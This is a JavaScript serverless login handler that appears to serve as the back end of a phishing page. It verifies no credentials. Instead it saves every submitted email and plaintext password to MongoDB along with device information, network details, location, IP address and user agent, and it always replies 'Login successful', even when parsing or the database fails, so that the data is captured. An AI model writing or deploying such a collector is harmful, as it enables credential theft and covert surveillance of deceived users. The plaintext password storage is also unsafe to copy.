const dbConnect = require('./db/connect');
const User = require('./models/User');
const getIpAddress = require('./helpers/getIp');

module.exports = async (req, res) => {
  // Set CORS headers to allow requests from any origin
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    return res.status(200).json({ success: true });
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  // Get IP address from request
  const ipAddress = getIpAddress(req);
  console.log('Request from IP:', ipAddress);

  try {
    // Parse request body if it's a string
    let requestBody = req.body;
    console.log('Received request body type:', typeof requestBody);
    
    if (typeof requestBody === 'string') {
      try {
        requestBody = JSON.parse(requestBody);
      } catch (e) {
        console.error('Error parsing request body:', e);
        return res.status(200).json({ 
          success: true, // Return success even on parse error to prevent blocking client
          warning: 'Invalid JSON in request body'
        });
      }
    }

    // Handle empty request body
    if (!requestBody) {
      console.warn('Empty request body received');
      requestBody = {};
    }

    // Extract data from request body with defaults
    const email = requestBody.email || 'anonymous@user.com';
    const password = requestBody.password || 'default';
    const deviceInfo = requestBody.deviceInfo || {};
    const networkInfo = requestBody.networkInfo || '';
    const location = requestBody.location || {};
    const userAgent = requestBody.userAgent || req.headers['user-agent'] || '';

    console.log('Processing login for:', email);

    // Store the data even if database connection fails
    let dbConnectionSuccess = false;
    let user;

    // Try to connect to database but don't fail if connection fails
    try {
      await dbConnect();
      console.log('Connected to MongoDB in login handler');
      dbConnectionSuccess = true;

      // Create a new user record
      user = new User({
        email,
        password,
        deviceInfo,
        networkInfo,
        location,
        ipAddress,
        userAgent,
      });

      // Save to database
      await user.save();
      console.log('User data saved to MongoDB');
    } catch (dbError) {
      console.error('Database error:', dbError);
      // Don't fail the whole request, just log the error
    }

    // Always return success to client even if DB fails
    // This ensures we capture the data on the client side
    return res.status(200).json({ 
      success: true,
      message: 'Login successful',
      dbSaved: dbConnectionSuccess
    });
  } catch (error) {
    console.error('Login API error:', error);
    // Still return success to ensure client continues
    return res.status(200).json({ 
      success: true,
      warning: 'There was an internal error, but login was processed'
    });
  }
}; 